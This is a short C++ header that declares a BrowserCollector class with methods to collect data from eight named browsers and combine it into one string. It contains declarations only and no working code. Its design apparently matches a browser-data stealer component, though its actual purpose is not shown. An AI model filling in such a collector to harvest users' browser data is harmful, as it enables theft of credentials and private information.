#ifndef BROWSER_COLLECTOR_H
#define BROWSER_COLLECTOR_H

#include <string>
#include <vector>

struct BrowserInfo {
    std::string name;
    std::string path;
};

class BrowserCollector {
public:
    static std::string CollectAllBrowsers();
    
private:
    static std::string CollectBrowserData(const char* name, const char* path);
    static std::string CollectChrome();
    static std::string CollectEdge();
    static std::string CollectFirefox();
    static std::string CollectOpera();
    static std::string CollectBrave();
    static std::string CollectVivaldi();
    static std::string CollectYandex();
    static std::string CollectSafari();
};

#endif
